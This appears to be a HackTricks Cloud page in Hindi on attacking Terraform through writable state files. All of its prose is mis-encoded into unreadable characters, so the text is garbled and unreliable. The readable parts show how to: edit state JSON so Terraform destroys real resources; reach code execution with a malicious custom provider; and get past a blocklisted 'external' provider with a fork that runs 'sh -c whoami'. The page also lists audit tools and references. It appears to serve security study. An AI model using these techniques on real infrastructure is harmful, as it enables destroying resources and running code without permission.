рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рд╕реНрдерд┐рддрд┐ рдлрд╝рд╛рдЗрд▓реЛрдВ рдкрд░ рд▓реЗрдЦрди рдкрд╣реБрдВрдЪ рд╣реИ рд▓реЗрдХрд┐рди рдЖрдк рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдХреЛрдб рдирд╣реАрдВ рдмрджрд▓ рд╕рдХрддреЗ, [**рдпрд╣ рд╢реЛрдз**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рд╡рд┐рдХрд▓реНрдк рджреЗрддрд╛ рд╣реИ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП:

### рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╣рдЯрд╛рдирд╛ <a href="#deleting-resources" id="deleting-resources"></a>

рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдирд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ 2 рддрд░реАрдХреЗ рд╣реИрдВ:

1. **рд╕реНрдерд┐рддрд┐ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдирд╛рдо рдХреЗ рд╕рдВрд╕рд╛рдзрди рдХреЛ рдбрд╛рд▓реЗрдВ рдЬреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдВрд╕рд╛рдзрди рдХреЛ рдирд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╢рд╛рд░рд╛ рдХрд░ рд░рд╣рд╛ рд╣реИ**

рдХреНрдпреЛрдВрдХрд┐ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рджреЗрдЦреЗрдЧрд╛ рдХрд┐ рд╕рдВрд╕рд╛рдзрди рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕реЗ рдирд╖реНрдЯ рдХрд░ рджреЗрдЧрд╛ (рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдВрд╕рд╛рдзрди рдЖрдИрдбреА рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП). рдкрд┐рдЫрд▓реЗ рдкреГрд╖реНрда рд╕реЗ рдЙрджрд╛рд╣рд░рдг:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **рд╕рдВрд╕рд╛рдзрди рдХреЛ рдРрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рдЬрд┐рд╕реЗ рдЕрдкрдбреЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛ (рддрд╛рдХрд┐ рдЗрд╕реЗ рд╣рдЯрд╛рдпрд╛ рдФрд░ рдкреБрдирдГ рдмрдирд╛рдпрд╛ рдЬрд╛рдП)**

рдПрдХ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рд▓рд┐рдП, рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдкреНрд░рдХрд╛рд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдХрд╛рдлреА рд╣реИ рддрд╛рдХрд┐ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдЙрд╕реЗ рд╣рдЯрд╛рдП рдФрд░ рдкреБрдирдГ рдмрдирд╛рдПред

### RCE

рдПрдХ рдХрд╕реНрдЯрдо рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ [рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) рдФрд░ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рд╕реНрдЯреЗрдЯ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреЛ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдмрдирд╛рдиреЗ рдпрд╛ рдПрдХ рдЦрд╛рд▓реА рд╕рдВрд╕рд╛рдзрди рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЦрддрд░рдирд╛рдХ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреЗ рд╕рд╛рде рдЙрд╕реЗ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИред рдореВрд▓ рдЕрдиреБрд╕рдВрдзрд╛рди рд╕реЗ рдЙрджрд╛рд╣рд░рдг:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ рдХрд┐рдП рдЧрдП рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреЛ рдмрджрд▓реЗрдВ

рдпрджрд┐ рдЖрдкрдХреЛ `hashicorp/external` рдХреЛ рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░рдХреЗ `external` рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреЛ рдкреБрдирдГ рд▓рд╛рдЧреВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ: рд╣рдо `https://registry.terraform.io/providers/nazarewk/external/latest` рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдХрд╛рд╢рд┐рдд рдПрдХ external рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХрд╛ рдлреЛрд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдЖрдк рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рдлреЛрд░реНрдХ рдпрд╛ рдкреБрдирд░реНрд╡реНрдпрд╡рд╕реНрдерд╛рдкрди рднреА рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
рддреЛ рдЖрдк `external` рдХрд╛ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## рдордВрдЬреВрд░реА рдЙрдкрдХрд░рдг

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec рдЖрдкрдХреЗ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХреЛрдб рдХрд╛ рд╕реНрдереИрддрд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рдВрднрд╛рд╡рд┐рдд рдЧрд▓рддрд┐рдпреЛрдВ рдХреЛ рдкрд╣рдЪрд╛рди рд╕рдХреЗред
* [**terascan**](https://github.com/tenable/terrascan): Terrascan рдПрдХ рд╕реНрдереИрддрд┐рдХ рдХреЛрдб рд╡рд┐рд╢реНрд▓реЗрд╖рдХ рд╣реИ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдПрд╕ рдХреЛрдб рдХреЗ рд▓рд┐рдПред

## рд╕рдВрджрд░реНрдн

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}
